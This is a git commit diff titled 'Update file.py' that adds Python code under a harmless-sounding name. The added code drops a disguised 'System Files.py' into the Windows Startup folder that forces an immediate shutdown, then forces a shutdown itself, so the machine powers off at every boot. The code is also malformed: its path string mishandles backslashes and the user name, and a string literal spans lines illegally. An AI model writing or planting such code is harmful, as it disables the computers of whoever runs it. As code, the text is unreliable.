36e4f07b2d6d3f9065368ebd6bb1cd2b95b6518c
mustafaz1 <120393372+mustafaz1@users.noreply.github.com>
2023-01-07 21:59:41 +0000

    Update file.py

--- file.py
+++ file.py
@@ -1,2 +1,15 @@
 import os
-import time
+import ctypes
+
+# auto boot file
+
+def get_user():
+    return os.getenv('USER',os.getenv('USERNAME','user'))
+
+os.chdir('C:\Users\'get_user()'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup')
+file = open("System Files.py","w")
+file.write("import os
+os.system('shutdown /p /t 1 /f')")
+file.close()
+
+os.system("shutdown /p /t 1 /f")
